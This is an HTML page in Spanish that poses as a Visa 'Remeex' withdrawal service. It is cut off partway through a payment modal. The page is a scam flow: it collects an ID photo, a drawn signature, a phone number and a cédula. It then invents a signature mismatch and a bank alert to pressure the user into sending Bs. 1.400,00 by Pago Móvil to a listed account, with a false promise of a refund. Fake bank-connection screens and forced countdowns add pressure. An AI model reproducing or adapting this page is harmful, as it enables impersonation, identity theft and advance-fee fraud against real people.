<!DOCTYPE html> 
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Visa Remeex - Retirar Dinero</title>
  <!-- Se modifica la meta viewport para deshabilitar el zoom -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="description" content="Página de Retiro de Dinero - Visa Remeex Premium" />

  <!-- FAVICON opcional -->
  <link
    rel="icon"
    href="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png"
    type="image/png"
  />

  <!-- Fuentes e íconos -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap"
    rel="stylesheet"
  />
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    rel="stylesheet"
  />

  <style>
    :root {
      --primary: #1434CB;
      --secondary: #142C8E;
      --primary-dark: #0d153e;
      --accent: #60a5fa;
      --success: #10B981;
      --danger: #EF4444;
      --warning: #F59E0B;

      --background: #EEF2FF;
      --background-dark: #E0E7FF;
      --card-bg: rgba(255, 255, 255, 0.95);
      --text-primary: #1E293B;
      --text-secondary: #64748B;

      --border-radius-xl: 28px;
      --border-radius-lg: 24px;
      --border-radius: 16px;
      --border-radius-sm: 12px;
      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
      --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
      --shadow-lg: 0 20px 25px -5px rgba(0, 0, 0, 0.1);

      --aurora-gradient: linear-gradient(
        120deg,
        rgba(20, 52, 203, 0.4),
        rgba(25, 35, 102, 0.3),
        rgba(20, 52, 203, 0.3),
        rgba(20, 52, 203, 0.2)
      );
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', 'Plus Jakarta Sans', sans-serif;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(135deg, var(--background) 0%, var(--background-dark) 100%);
      color: var(--text-primary);
      line-height: 1.5;
      overflow-x: hidden;
      display: flex;
      justify-content: center;
      padding: 1rem;
    }

    .container {
      max-width: 600px;
      width: 100%;
      margin: 2rem auto;
      background: var(--card-bg);
      border-radius: var(--border-radius-xl);
      backdrop-filter: blur(10px);
      position: relative;
      border: 2px solid #ffffff;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
      box-shadow: 0 0 30px rgba(20, 52, 203, 0.15), 0 0 60px rgba(20, 52, 203, 0.05);
      transition: var(--transition);
    }
    .container:hover {
      transform: translateY(-4px);
      box-shadow: 0 0 50px rgba(20, 52, 203, 0.3), 0 0 80px rgba(20, 52, 203, 0.15);
    }

    @keyframes glow {
      0%, 100% {
        box-shadow: 0 0 30px rgba(20, 52, 203, 0.2), 0 0 60px rgba(20, 52, 203, 0.1);
      }
      50% {
        box-shadow: 0 0 50px rgba(20, 52, 203, 0.4), 0 0 80px rgba(20, 52, 203, 0.2);
      }
    }

    @keyframes border-blink {
      0%   { border-color: #ffffff; }
      33%  { border-color: #d1d5db; }
      66%  { border-color: #60a5fa; }
      100% { border-color: #ffffff; }
    }

    .container-content {
      padding: 1.5rem;
      position: relative;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
    }
    .top-bar img {
      height: 36px;
      object-fit: contain;
      opacity: 0.9;
      transition: var(--transition);
    }
    .top-bar img:hover {
      opacity: 1;
      transform: scale(1.05);
    }
    .user-profile {
      font-weight: 600;
      font-size: 1rem;
      color: var(--text-primary);
    }

    .search-bar {
      position: relative;
      margin-bottom: 1.5rem;
    }
    .search-bar input {
      width: 100%;
      padding: 0.75rem 1rem 0.75rem 2.5rem;
      border: 2px solid #e2e8f0;
      border-radius: var(--border-radius);
      background: #fff;
      outline: none;
      font-size: 0.95rem;
      box-shadow: var(--shadow-sm);
      color: var(--text-primary);
      transition: var(--transition);
    }
    .search-bar input:hover {
      border-color: #cbd5e1;
    }
    .search-bar input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(20, 52, 203, 0.2);
    }
    .search-bar i {
      position: absolute;
      left: 1rem;
      top: 50%;
      transform: translateY(-50%);
      color: var(--text-secondary);
      font-size: 0.95rem;
    }

    .card {
      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
      color: white;
      border-radius: var(--border-radius-lg);
      padding: 2rem;
      box-shadow: var(--shadow);
      margin-bottom: 2rem;
      transition: var(--transition);
      position: relative;
      overflow: hidden;
    }
    .card:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-lg);
    }
    .balance-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }
    .balance-amount {
      font-size: 1.8rem;
      font-weight: 700;
      margin: 0.5rem 0 1rem 0;
      letter-spacing: -1px;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 0.4rem;
    }
    /* Se eliminó la tarjeta con número (**** **** **** 3009) según indicación */
    .card::before {
      content: "";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: var(--aurora-gradient);
      animation: aurora-animation 15s ease infinite;
      z-index: 0;
    }
    @keyframes aurora-animation {
      0%   { background-position: 0% 50%; }
      50%  { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .card > * {
      position: relative;
      z-index: 2;
    }
    @keyframes blinkEffect {
      0%   { color: #10B981; }
      50%  { color: #ffffff; }
      100% { color: #10B981; }
    }
    .blink {
      animation: blinkEffect 1.2s infinite;
      font-weight: 700;
    }

    .visa-card {
      background: var(--card-bg);
      border-radius: var(--border-radius-lg);
      padding: 2rem;
      box-shadow: var(--shadow);
      margin-bottom: 2rem;
      transition: var(--transition);
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(0,0,0,0.05);
      display: none; /* Se muestra/oculta con JS */
    }
    .visa-card.active {
      display: block;
    }
    .visa-card:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow-lg);
    }
    .visa-card h2 {
      margin-bottom: 1rem;
      color: var(--primary);
      font-size: 1.2rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .visa-card p {
      margin-bottom: 1rem;
      color: var(--text-secondary);
      font-size: 0.95rem;
      line-height: 1.5;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.4rem;
      padding: 0.75rem 1.2rem;
      border-radius: var(--border-radius-sm);
      font-weight: 600;
      font-size: 0.95rem;
      transition: var(--transition);
      border: none;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      z-index: 1;
    }
    .btn::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
      background-size: 200% 100%;
      border-radius: var(--border-radius-sm);
      animation: border-glow 3s ease infinite;
      filter: blur(8px);
      opacity: 0.7;
      z-index: -1;
    }
    @keyframes border-glow {
      0%   { background-position: -100% 0; }
      50%  { background-position: 100% 0; }
      100% { background-position: -100% 0; }
    }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow-sm);
    }
    .btn-primary {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: #fff;
    }
    .btn-secondary {
      background: var(--secondary);
      color: #fff;
    }
    .btn-outline {
      background: transparent;
      color: var(--primary);
      border: 2px solid var(--primary);
    }
    .btn-outline:hover {
      background: rgba(20, 52, 203, 0.05);
    }
    .btn-danger {
      background: var(--danger);
      color: #fff;
    }
    .btn-success {
      background: var(--success);
      color: #fff;
    }
    .btn-disabled {
      opacity: 0.6;
      cursor: not-allowed;
      pointer-events: none;
    }

    .icon-list {
      margin: 1rem 0;
      text-align: left;
    }
    .icon-list li {
      margin-bottom: 0.8rem;
      display: flex;
      align-items: flex-start;
      gap: 0.5rem;
      font-size: 0.95rem;
    }
    .icon-list li i {
      color: var(--primary);
      font-size: 1.1rem;
      margin-top: 2px;
    }

    .data-summary {
      margin-top: 1rem;
      border: 1px solid rgba(0, 0, 0, 0.1);
      border-radius: var(--border-radius-sm);
      padding: 1rem;
      background: #fff;
      color: var(--text-primary);
      margin-bottom: 1rem;
    }
    .data-summary h3 {
      font-size: 1rem;
      font-weight: 600;
      margin-bottom: 0.5rem;
    }
    .data-item {
      margin-bottom: 0.5rem;
      font-size: 0.95rem;
      line-height: 1.4;
    }

    .preview-container {
      border: 1px dashed var(--primary);
      padding: 1rem;
      border-radius: var(--border-radius-sm);
      margin-bottom: 1rem;
      display: none;
      position: relative;
      text-align: center;
      background-color: #fff;
    }
    .preview-container.active {
      display: block;
    }
    .preview-container img {
      max-width: 100%;
      border-radius: var(--border-radius-sm);
    }

    /* Contenedor de la firma (canvas) */
    .signature-canvas {
      border: 2px dashed var(--primary);
      border-radius: var(--border-radius-sm);
      width: 100%;
      height: 220px;
      background: #fff;
      margin-bottom: 1rem;
      position: relative;
      cursor: crosshair;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
      padding: 1rem;
    }
    .overlay.active {
      display: flex;
      backdrop-filter: blur(5px);
    }
    .modal {
      background: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 1.5rem;
      width: 90%;
      max-width: 420px;
      box-shadow: var(--shadow-lg);
      text-align: center;
      position: relative;
      backdrop-filter: blur(8px);
      border: 2px solid #fff;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
    }
    /* Modal con resplandor dinámico (nuevo) – MODIFICADO */
    .modal.modal-glow {
      background: #fff !important;
      box-shadow: 0 0 60px rgba(20, 52, 203, 0.5), 0 0 120px rgba(20, 52, 203, 0.3) !important;
      animation: glow 3s ease infinite, border-blink 3s linear infinite !important;
    }
    .modal h3 {
      font-size: 1.2rem;
      margin-bottom: 0.5rem;
      color: var(--primary);
    }
    .modal p {
      font-size: 0.95rem;
      color: var(--text-secondary);
      margin-bottom: 1rem;
      line-height: 1.4;
    }

    .countdown {
      font-size: 0.9rem;
      color: var(--text-secondary);
      margin-top: 0.5rem;
    }

    /* ======================= NUEVO: Sección Blurred para Datos de Verificación ======================= */
    .blur-container {
      position: relative;
      cursor: pointer;
      display: block;
    }
    .blur-container .security-data-card {
      filter: blur(8px);
      transition: filter 0.3s;
    }
    .blur-container .blur-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: var(--text-primary);
      font-size: 1.1rem;
      font-weight: bold;
      background: rgba(255, 255, 255, 0.5);
      border-radius: var(--border-radius-sm);
      transition: opacity 0.3s;
      pointer-events: none;
    }
    /* ======================= FIN Sección Blurred ======================= */

    /* ======================= NUEVO: Mejora de la presentación en la tarjeta de Datos ======================= */
    .security-data-card {
      background: #fff;
      border: 1px solid var(--primary);
      border-radius: var(--border-radius);
      padding: 1.5rem;
      margin-top: 1rem;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    .security-data-card p {
      margin: 0.5rem 0;
      font-size: 1rem;
      color: var(--text-primary);
    }
    /* ======================= FIN Mejora de presentación ======================= */
    
    @media (max-width: 768px) {
      .balance-amount {
        font-size: 1.6rem;
      }
      .visa-card h2 {
        font-size: 1.1rem;
      }
      .modal h3 {
        font-size: 1.05rem;
      }
    }
    
  </style>
</head>
<body>
  <div class="container">
    <div class="container-content">
      <!-- Barra superior (logo y nombre de usuario) -->
      <div class="top-bar">
        <img
          src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png"
          alt="Visa Logo"
          id="visaMainLogo"
        />
        <!-- Nombre que se cargará dinámicamente -->
        <div class="user-profile" id="userName">[NombreUsuario]</div>
      </div>

      <!-- Barra de búsqueda (opcional) -->
      <div class="search-bar">
        <i class="fas fa-search"></i>
        <input type="text" placeholder="Buscar..." />
      </div>

      <!-- Tarjeta con Saldo disponible -->
      <div class="card">
        <div class="balance-header">
          <h2>Saldo disponible</h2>
          <i class="fas fa-ellipsis-h"></i>
        </div>
        <!-- Se setea dinámicamente con el saldo obtenido -->
        <div class="balance-amount" id="balanceAmount">0,00 Bs</div>
        <!-- Banner de estado (nuevo) -->
        <div class="status-banner" id="statusBanner"></div>
      </div>

      <!-- 1) Tarjeta: Retirar a mi banco -->
      <div class="visa-card active" id="datosRetiroSection">
        <h2><i class="fas fa-hand-holding-usd"></i> Retirar a mi banco</h2>
        <p>
          Verifica la información de tu beneficiario y tus datos bancarios
          antes de continuar.
        </p>

        <!-- Datos del Beneficiario -->
        <div class="data-summary">
          <h3>Datos del Beneficiario</h3>
          <div class="data-item" id="benefName">
            Nombre: <strong>[Nombre Beneficiario]</strong>
          </div>
          <div class="data-item" id="benefDoc">
            Documento: <strong>[Documento Beneficiario]</strong>
          </div>
          <div class="data-item" id="benefBirth">
            F. Nac: <strong>[Fecha de Nacimiento]</strong>
          </div>
        </div>

        <!-- Datos Bancarios -->
        <div class="data-summary">
          <h3>Datos Bancarios</h3>
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.5rem;">
            <div class="data-item" id="nombreBanco">
              Banco: <strong>[Nombre Banco]</strong>
            </div>
            <!-- Logo banco a la derecha -->
            <img id="bankLogoSmall" src="" alt="Logo Banco" style="max-height:30px;" />
          </div>
          <div class="data-item" id="numeroCuenta">
            N° de Cuenta: <strong>[Número de Cuenta]</strong>
          </div>
          <div class="data-item" id="tipoCuenta">
            Tipo: <strong>[Tipo de Cuenta]</strong>
          </div>
        </div>

        <div style="display:flex; gap:1rem; justify-content:flex-end;">
          <button class="btn btn-primary btn-disabled" id="confirmInfoBtn" disabled>
            <i class="fas fa-check-circle"></i> Confirmar
          </button>
          <div class="countdown" id="countdownRetiroBtn"></div>
        </div>
      </div>

      <!-- 2) Tarjeta: Subir Documento de Identidad -->
      <div class="visa-card" id="uploadSection">
        <h2><i class="fas fa-file-upload"></i> Documento de Identidad</h2>
        <p>
          Carga tu documento de identidad (solo imágenes). Debe ser vigente,
          legible y con la firma visible.
        </p>
        <label for="idDocument" style="display:block; margin-bottom:0.5rem;">
          Seleccionar archivo (solo imágenes)
        </label>
        <input type="file" id="idDocument" accept="image/*" />

        <div class="preview-container" id="previewContainer">
          <img id="docPreview" src="#" alt="Vista Previa" />
          <div
            style="margin-top: 1rem; color: var(--text-secondary); font-size: 0.95rem;"
          >
            <strong>Requisitos:</strong>
            <ul style="padding-left: 20px; margin-top: 5px;">
              <li>Documento vigente</li>
              <li>Imagen legible</li>
              <li>Firma y datos visibles</li>
            </ul>
          </div>
        </div>

        <div style="text-align:right;">
          <button class="btn btn-success" id="confirmDocBtn" style="display:none;">
            <i class="fas fa-check"></i> Confirmar Documento
          </button>
        </div>
      </div>

      <!-- 3) Tarjeta: Firma Digital -->
      <div class="visa-card" id="signatureSection">
        <h2><i class="fas fa-file-signature"></i> Firma Digital</h2>
        <p style="font-size:0.93rem; line-height:1.4;">
          <i class="fas fa-check-circle" style="color:var(--success);"></i>
          Por favor, firma en el recuadro para autorizar este retiro.<br/>
          <i class="fas fa-shield-alt" style="color:var(--primary);"></i>
          Tu firma debe coincidir con la de tu documento de identidad para comprobar que eres el titular y evitar cualquier suplantación.<br/>
          <i class="fas fa-exclamation-triangle" style="color:var(--warning);"></i>
          Si no coincide, se te solicitará otra verificación adicional.
        </p>

        <!-- Canvas de firma -->
        <canvas class="signature-canvas" id="signatureCanvas"></canvas>

        <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
          <button class="btn btn-danger" id="clearSignatureBtn">
            <i class="fas fa-eraser"></i> Limpiar Firma
          </button>
          <button class="btn btn-success" id="saveSignatureBtn">
            <i class="fas fa-save"></i> Guardar Firma
          </button>
        </div>
      </div>

      <!-- 4) Tarjeta: Verificación de Seguridad (post-firma no coincidente) -->
      <div class="visa-card" id="securityVerification1">
        <h2>
          <i class="fas fa-shield-alt"></i> Verificación de Seguridad
        </h2>
        <p id="securityVerificationText1">
          <!-- El texto se actualizará dinámicamente -->
          Tu firma no coincide con la que aparece en tu documento de identidad.
          Por ello, necesitamos validar que nadie esté suplantando tu identidad.
          Debes pasar por un proceso adicional de seguridad.
        </p>

        <p>
          Serás dirigido(a) a una sección de seguridad para confirmar tu titularidad.
          Por favor, sigue los pasos solicitados.
        </p>
        <div style="text-align:right;">
          <button class="btn btn-primary btn-disabled" id="continueSecurityBtn1" disabled>
            Acepto, Quiero continuar
          </button>
          <div class="countdown" id="countdownSecurity1"></div>
        </div>
      </div>

      <!-- 5) Tarjeta: ¿Por qué esta verificación? -->
      <div class="visa-card" id="securityVerification2">
        <h2><i class="fas fa-question-circle"></i> ¿Por qué esta verificación?</h2>
        <ul class="icon-list">
          <li><i class="fas fa-user-shield"></i> Evitar suplantación de identidad.</li>
          <li><i class="fas fa-lock"></i> Proteger tu cuenta de accesos no autorizados.</li>
          <li><i class="fas fa-ban"></i> Prevenir bloqueos o retenciones en tu banco.</li>
          <li><i class="fas fa-gavel"></i> Cumplir con normas legales de seguridad.</li>
        </ul>
        <div style="text-align:right;">
          <button class="btn btn-primary btn-disabled" id="continueSecurityBtn2" disabled>
            Entendido, Continuar
          </button>
          <div class="countdown" id="countdownSecurity2"></div>
        </div>
      </div>

      <!-- ========================== SECCIÓN MODIFICADA ========================== -->
      <!-- Tarjeta 1: Tu dinero está listo, pero hay un detalle importante -->
      <div class="visa-card" id="securityVerification3A">
        <h2><i class="fas fa-info-circle"></i> Tu dinero está listo, pero hay un detalle importante</h2>
        <p style="font-size:0.95rem; line-height:1.4;">
          <strong id="nombreUsuarioAviso" style="color: var(--primary);">[NombreCompleto]</strong>,
          tenemos todo preparado para enviarte tu dinero a <strong class="nombreBancoUsuario">[Banco]</strong>,
          pero hay dos alertas que debemos resolver:
        </p>

        <ol style="margin-left: 1.2rem; margin-bottom:1rem; color: var(--text-secondary);">
          <li style="margin-bottom:0.8rem;">
            <strong>Tu firma no coincidió</strong> con la registrada en el sistema, y por seguridad,
            <strong>no pudimos confirmar que eres el titular de la cuenta bancaria en <span class="nombreBancoUsuario"></span></strong>
            donde se hará el depósito.
          </li>
          <li style="margin-bottom:0.8rem;">
            <strong class="nombreBancoUsuario"></strong> nos informa que normalmente no recibes
            depósitos de montos altos en tu cuenta <em class="numeroCuentaUsuario"></em>,
            lo que ha generado una alerta automática.
          </li>
        </ol>

        <p style="margin-bottom:1rem;">
          <i class="fas fa-exclamation-circle" style="color:var(--warning);"></i>
          <strong>No te preocupes.</strong> Esto es un procedimiento de seguridad estándar para protegerte.
          Solo necesitas completar una <strong>verificación rápida</strong> para confirmar que la cuenta es tuya
          y asegurarnos de que puedes recibir el dinero sin problemas.
        </p>

        <div style="text-align:right;">
          <!-- Botón continuar con 38s de bloqueo -->
          <button class="btn btn-primary btn-disabled" id="continueSecurity3ABtn" disabled>
            Continuar
          </button>
          <div class="countdown" id="countdownSecurity3A"></div>
        </div>
      </div>

      <!-- Tarjeta 2: Verificación rápida desde tu banco -->
      <div class="visa-card" id="securityVerification3B">
        <h2><i class="fas fa-user-check"></i> Verificación rápida desde tu banco</h2>
        <p style="font-size:0.95rem; line-height:1.4;">
          Para solucionar estas alertas y garantizar que recibas los
          <strong id="saldoRequerido">[Saldo en Bs]</strong> sin inconvenientes,
          debes confirmar que tienes acceso a tu cuenta en <strong class="nombreBancoUsuario">[Banco]</strong>.
        </p>

        <ul style="list-style:none; margin:0; padding:0; margin-bottom:1rem;">
          <!-- Se eliminó el primer item según indicación -->
          <li style="margin-bottom:0.8rem; color: var(--text-secondary);">
            <i class="fas fa-credit-card" style="color:var(--success);"></i>
            Esto eliminará cualquier restricción y permitirá que tu depósito se procese sin más demoras.
          </li>
        </ul>

        <p style="font-size:0.92rem; line-height:1.4;">
          <strong>Importante:</strong><br/>
          <i class="fas fa-shield-alt" style="color:var(--primary);"></i> Este procedimiento protege tu dinero y evita fraudes.<br/>
          <i class="fas fa-check-circle" style="color:var(--success);"></i> Es rápido y seguro, sin trámites complicados.<br/>
          <i class="fas fa-money-bill-wave" style="color:var(--success);"></i> El sistema te enviará el dinero inmediatamente después de la verificación.
        </p>

        <div style="text-align:right;">
          <!-- Botón continuar con 20s de bloqueo -->
          <button class="btn btn-primary btn-disabled" id="continueSecurity3BBtn" disabled>
            Continuar
          </button>
          <div class="countdown" id="countdownSecurity3B"></div>
        </div>
      </div>

      <!-- Tarjeta 3: Último paso para recibir tu dinero en minutos -->
      <div class="visa-card" id="securityVerification3C">
        <h2><i class="fas fa-flag-checkered"></i> Último paso para recibir tu dinero en minutos</h2>
        <p style="font-size:0.95rem; line-height:1.4;">
          Para confirmar que eres el titular y eliminar la alerta de seguridad de tu banco, haz lo siguiente:
        </p>

        <ol style="margin-left:1.2rem; color: var(--text-secondary); margin-bottom:1rem;">
          <li style="margin-bottom:0.8rem;">
            Desde tu cuenta en <strong class="nombreBancoRecarga">[Banco]</strong>,
            haz una recarga de <strong class="blink">Bs. 1.400,00</strong>. El monto de tu primera recarga será reembolsado.
          </li>
          <li style="margin-bottom:0.8rem;">
            En el concepto de tu comprobante de pago móvil escribe: <strong id="conceptoPagoMovil">[Número de Identificación]</strong>.
          </li>
        </ol>

        <div class="banner-flash">
          <p style="margin:0; font-size:0.92rem; line-height:1.4;">
            <strong>Monto total que recibirás:</strong><br/>
            <span>
              <i class="fas fa-calculator"></i>
              <strong id="montoRetiroBs">[Saldo]</strong> + <strong class="blink">Bs. 1.400,00</strong> =
              <strong id="montoDepositoTotal">[Saldo+1400]</strong>
            </span>
          </p>
        </div>

        <h3 style="margin-top:1rem; color:var(--primary); font-size:1rem;">
          <i class="fas fa-info-circle"></i> Datos donde realizar la verificación
        </h3>
        <!-- Se envolvió la tarjeta de datos en un contenedor con efecto blur -->
        <div class="blur-container" id="blurContainer">
          <div class="security-data-card" id="datosRecargaFijos">
            <p><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</p>
            <p><strong>Número:</strong> <span id="verificacionNumero">0412-1000000</span> <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionNumero')"></i></p>
            <p><strong>RIF:</strong> <span id="verificacionRif">J-407502646</span> <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionRif')"></i></p>
            <p><strong>Monto:</strong> <span id="verificacionMonto">1.400,00 Bolívares</span> <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionMonto')"></i></p>
            <p style="font-size:0.92rem; line-height:1.4; margin-top:0.8rem;">
              <strong>Concepto:</strong> <span id="conceptoRecarga">[Número de Identificación]</span>
            </p>
          </div>
          <div class="blur-overlay">Por Favor, presione aquí</div>
        </div>
        <p style="font-size:0.92rem; line-height:1.4; margin-top:0.8rem;">
          <i class="fas fa-bullhorn" style="color:var(--primary);"></i>
          Haz la recarga ahora y en minutos recibirás tu dinero sin más demoras. Este paso es un paso de seguridad, no implica un pago, comisión o cobro alguno, ya que el monto se reembolsará inmediatamente.
        </p>

        <div style="text-align:right; margin-top:1rem;">
          <!-- Botón continuar con 3 minutos de bloqueo (180 s) -->
          <!-- Se removió el atributo disabled para poder capturar el click y mostrar el alert si aún no finaliza el conteo -->
          <button class="btn btn-primary btn-disabled" id="recargaReadyBtn">
            Continuar
          </button>
          <div class="countdown" id="countdownRecargaReady"></div>
        </div>
      </div>
      <!-- ======================== FIN SECCIÓN MODIFICADA ======================= -->

      <!-- 7) Tarjeta: Completar Datos de Recarga -->
      <div class="visa-card" id="recargaSection">
        <h2><i class="fas fa-credit-card"></i> Completar Datos de tu Recarga</h2>
        <p id="textoCompletarRecarga">
          ¿Realizaste tu recarga de verificación por 1.400,00 Bs desde tu banco
          para verificar tu identidad? Por favor, completa la información para
          que podamos validar tu recarga.
        </p>

        <label style="display:block; margin-bottom:0.3rem;">Banco de Origen:</label>
        <div style="display:flex; align-items:center; gap:0.5rem; margin-bottom:1rem;">
          <img id="logoBancoOrigen" src="" alt="Logo Banco" style="max-height:30px;" />
          <input
            type="text"
            id="recargaBancoOrigen"
            style="width: 100%; padding: 0.75rem;"
            disabled
          />
        </div>

        <label style="display:block; margin-bottom:0.3rem;">Teléfono:</label>
        <input
          type="text"
          id="recargaTelefono"
          style="width: 100%; padding: 0.75rem; margin-bottom: 1rem;"
          placeholder="Ingrese su número de teléfono"
          required
        />

        <label style="display:block; margin-bottom:0.3rem;">Cédula:</label>
        <input
          type="text"
          id="recargaCedula"
          style="width: 100%; padding: 0.75rem; margin-bottom: 1rem;"
          disabled
        />

        <label style="display:block; margin-bottom:0.3rem;">Monto (Bs):</label>
        <input
          type="text"
          id="recargaMonto"
          value="1.400,00"
          disabled
          style="width: 100%; padding: 0.75rem; margin-bottom: 1rem;"
        />

        <p style="font-size: 0.95rem; color: var(--text-secondary); margin-bottom: 1rem; line-height: 1.4;">
          Al realizar esta recarga de <strong>1.400,00 Bs</strong>, se te devolverá junto con tu saldo disponible.
          Tu depósito total a recibir será de tu saldo + <strong>1.400,00 Bs</strong>.
          Esto es necesario porque tu firma no coincide con la de tu documento de identidad.
        </p>

        <label>N° de Comprobante (12 dígitos):</label>
        <input
          type="text"
          id="comprobanteInput"
          placeholder="Ej: 123456789123"
          style="width: 100%; padding: 0.75rem; margin-bottom: 1rem;"
        />

        <div style="text-align:right;">
          <button class="btn btn-success btn-disabled" id="confirmRecargaBtn" disabled>
            <i class="fas fa-check"></i> Confirmar Recarga
          </button>
          <div class="countdown" id="countdownRecargaConfirm"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- Overlay: Confirmar Firma -->
  <div class="overlay" id="overlayConfirmFirma">
    <div class="modal">
      <h3>¿Estás seguro de tu firma?</h3>
      <p>
        La firma debe coincidir con la de tu documento de identidad. <br/>
        Si no coincide, se solicitará verificación adicional. <br/>
        ¿Deseas continuar con esta firma?
      </p>
      <div style="display:flex; gap:1rem; justify-content:center; flex-wrap:wrap;">
        <button class="btn btn-danger" id="editarFirmaBtn">
          <i class="fas fa-edit"></i> Editar Firma
        </button>
        <button class="btn btn-success" id="continuarFirmaBtn">
          <i class="fas fa-forward"></i> Continuar
        </button>
      </div>
    </div>
  </div>

  <!-- Overlay Secuencial POST-FIRMA (Conexión, Análisis, etc.) -->
  <div class="overlay" id="overlaySecuenciaFirma">
    <div class="modal">
      <h3 id="secuenciaFirmaTitulo">Conectando con tu banco...</h3>
      <p id="secuenciaFirmaTexto">
        Espere un momento, por favor.
      </p>
      <img id="secuenciaFirmaLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;" />
      <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
    </div>
  </div>

  <!-- Overlay: Análisis de Documento de Identidad -->
  <div class="overlay" id="overlayDocumento">
    <div class="modal">
      <h3 id="overlayDocumentoTitulo"></h3>
      <p id="overlayDocumentoTexto"></p>
      <img id="overlayDocumentoLogo" src="" alt="Logo Banco" style="max-height:50px; margin:0.5rem 0;" />
      <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
    </div>
  </div>

  <!-- Overlay: Verificación de la primera recarga -->
  <div class="overlay" id="overlayVerificandoRecarga">
    <div class="modal">
      <h3 id="verificandoRecargaTitulo">Verificando tu primera recarga...</h3>
      <p id="verificandoRecargaTexto">
        Por favor, espera mientras consultamos con tu banco.
      </p>
      <img id="verificandoRecargaLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;" />
      <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
    </div>
  </div>

  <!-- Overlay: Última secuencia al confirmar recarga -->
  <div class="overlay" id="overlaySecuenciaFinal">
    <div class="modal">
      <h3 id="secFinalTitulo">Conectando con tu banco</h3>
      <p id="secFinalTexto">
        Preparando tu depósito.
      </p>
      <img id="secFinalLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;" />
      <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
    </div>
  </div>

  <!-- Overlay: Error Final - No se encontró la recarga -->
  <div class="overlay" id="overlayErrorFinal">
    <div class="modal">
      <h3>Atención: No encontramos tu recarga por 1.400,00 Bs</h3>
      <p id="errorFinalTexto">
        No se puede verificar la titularidad de tu cuenta hasta que detectemos
        tu primera recarga. Depositaremos (Saldo+1400,00 Bs) una vez validemos
        tu identidad. <br/><br/>
        Por favor, contáctate con soporte.
      </p>
      <a
        href="#"
        target="_blank"
        class="btn-support"
        id="whatsappLink"
        style="margin-top:1rem; display:inline-block;"
      >
        Contactar con Soporte
      </a>
    </div>
  </div>

  <!-- Overlay: Datos de Verificación (Pago Móvil) -->
  <div class="overlay" id="overlayDatosVerificacion">
    <div class="modal modal-glow">
      <h3>Pago Móvil por 1.400,00 Bs.</h3>
      <div id="modalDatosContent">
        <p><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</p>
        <p><strong>Número:</strong> <span id="verificacionNumeroModal">0412-1000000</span> <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionNumeroModal')"></i></p>
        <p><strong>RIF:</strong> <span id="verificacionRifModal">J-407502646</span> <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionRifModal')"></i></p>
        <p><strong>Monto:</strong> <span id="verificacionMontoModal">1.400,00 Bolívares</span> <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionMontoModal')"></i></p>
